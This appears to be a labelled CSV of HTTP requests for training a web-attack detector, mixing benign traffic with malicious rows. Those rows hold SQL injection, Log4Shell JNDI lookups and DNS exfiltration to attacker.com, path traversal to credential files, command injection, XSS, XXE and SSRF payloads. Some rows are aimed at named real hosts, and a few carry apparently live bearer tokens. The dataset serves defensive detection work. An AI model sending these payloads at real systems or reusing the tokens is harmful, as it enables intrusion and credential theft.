method,path,query,headers,body,ua,label
GET,/,,GET /feed/news.rss,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /auth/logout/confirm,,,0
POST,/checkout,,Host: example.com; Accept: */*,username=user675&password=pass366,Mozilla/5.0 (Linux; Android 11),0
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/api/v1/users,q=| cat /etc/passwd,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/favicon.ico,,,,,0
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,GET /search?q=1+1=2,,,0
POST,/login,,Host: example.com; Accept: */*,input=../../../../etc/passwd,sqlmap/1.5.2,1
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
DELETE,/index.php,,Host: example.com; Accept: */*,input=../../../../etc/passwd,Nmap Scripting Engine,1
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,GET /api/v1/products/101,,,0
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/favicon.ico,,,,,0
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,query { __schema { types { name } } },,,1
PUT,/search,,Host: example.com; Accept: */*,input=&& whoami,curl/7.68.0,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/favicon.ico,,,,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,GET /login,,,0
GET,/,,GET /search?q=C%23,,,0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,javascript:alert(1),,,1
GET,/favicon.ico,,,,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/favicon.ico,,,,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,../../../../etc/passwd,,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/favicon.ico,,,,,0
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/favicon.ico,,,,,0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,GET /login,,,0
GET,/login,q=../../../../etc/passwd,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/favicon.ico,,,,,0
POST,/index.php,controller=pjAdmin&action=%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Content-Length: 0; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:48.0) Gecko/20100101 Firefox/48.0,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:48.0) Gecko/20100101 Firefox/48.0,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,http://127.0.0.1:22,,,1
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/api/v1/users,q=http://127.0.0.1:8080/admin,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/ProcessWait.aspx,POBatch=</script><script>alert(document.domain)</script>&WaitDuration=3,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1",1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/index.php,p=%3Cimg%20src%20onerror=alert(/XSS/)%3E&debug_url=1,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/wp-content/plugins/podcast-channels/getid3/demos/demo.write.php,Filename=Filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (X11; CrOS aarch64 15236.12.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; CrOS aarch64 15236.12.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",1
GET,/favicon.ico,,,,,0
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/web-api/orders/2269628a-cf7e-465a-bb97-b835e7e4d9d9,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzkwODk3NjUiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiMzk3NzRkMDktOGZkMy00NzE5LTgzZmQtNGRkMjhiOWQ4NzFlIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzkwODk3NjUiLCJzdWIiOiJXRUJTSVRFQDA3NzkwODk3NjUiLCJpYXQiOjE3NzA2MzAyMzksImV4cCI6MTc3MTIzNTAzOX0.L2WjBXu0wdCLhzDRzCz2Zg31s-Kh0KiYh9m8QnXNMVE; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 397ad3de-8279-479b-a4b7-60a9ee1629a6",,python-requests/2.32.5,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /settings/security,,,0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/favicon.ico,,,,,0
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/login.php,mid=0&usr=test%27%20draggable=true%20ondrag=alert(document.domain)%20value=%27p,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78",1
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/favicon.ico,,,,,0
GET,/,,${os.system('id')},,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/web-api/orders/d8a950f4-453a-48dd-9847-d1a3c1c1ae72,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzI5NzExMjEiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiMzA0Zjg0ZGYtOTZlYS00N2JlLWIzMGYtNjQ4YzIzOGM1MjI4IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzI5NzExMjEiLCJzdWIiOiJXRUJTSVRFQDA3NzI5NzExMjEiLCJpYXQiOjE3NzA2MzAzMjYsImV4cCI6MTc3MTIzNTEyNn0.nfUQuCEaw-avUZDk_tYdis8CvKStKLSKWmY4RCPHzus; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: ae963984-988e-467e-9020-f43fd1513e53",,python-requests/2.32.5,0
GET,/,,' or '1'='1,,,1
POST,/admin,,Host: example.com; Accept: */*,input=; ls -la,Nikto/2.1.6,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,id=1' OR '1'='1,,,1
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,GET /,,,0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/includes/lib/gz.php,file=/themes/../../../../../../../../../etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",,"Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",1
GET,"/loyalty_enu/start.swe/>"">/script><script>alert(document.domain)</script>",,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.6.25",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.6.25",1
GET,/,,GET /settings/security,,,0
GET,/,,__proto__[admin]=true,,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /checkout/step1,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /search?q=C%23,,,0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,POST /newsletter/subscribe,,,0
GET,/api/v1/users,"q="" onmouseover=alert(1) """,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
DELETE,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/index.hsp,"m=',alert(document.domain),'","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.70",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.70",1
GET,/,lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.7.20",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.7.20",1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,GET /search?q=security,,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,expect://id,,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,${os.system('id')},,,1
PUT,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/favicon.ico,,,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=' OR 'x'='x,Nmap Scripting Engine,1
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,$(whoami),,,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,${os.system('id')},,,1
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
PUT,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,GET /search?q=machine+learning,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /search?q=security,,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /auth/logout/confirm,,,0
POST,/index.php,,Host: example.com; Accept: */*,input=' OR 'x'='x,Nmap Scripting Engine,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,GET /favicon.ico,,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
DELETE,/admin,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",curl/7.68.0,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,GET /health,,,0
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,javascript:alert(1),,,1
GET,/sync/dropbox/download,challenge=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; CrOS x86_64 15231.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; CrOS x86_64 15231.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",1
DELETE,/search,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,Nmap Scripting Engine,1
GET,/,,GET /,,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/favicon.ico,,,,,0
GET,/,,admin*)(| (password=*)),,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
POST,/index.php,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,Nikto/2.1.6,1
GET,/,,admin*)(| (password=*)),,,1
GET,/,,{{7*7}} or {{config.items()}},,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,php://input,,,1
PUT,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,GET /static/css/style.css,,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/favicon.ico,,,,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,POST /newsletter/subscribe,,,0
GET,/php/device_graph_page.php,is2sim=%22zlo%20onerror=alert(1)%20%22,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0,,Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0,1
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
PUT,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,GET /static/css/style.css,,,0
GET,/,,GET /manifest.json,,,0
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,(&(uid=admin)(|(password=*))),,,1
POST,/login,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,sqlmap/1.5.2,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET /favicon.ico,,,0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /login,,,0
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,GET /config/app-settings.json,,,0
GET,/,,//////////////////etc/passwd,,,1
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,GET /static/css/style.css,,,0
GET,/,,GET /api/v1/ping,,,0
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/index.php,q=http://127.0.0.1:8080/admin,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,admin*)(| (password=*)),,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,id=1' OR '1'='1,,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,javascript:alert(1),,,1
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/favicon.ico,,,,,0
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
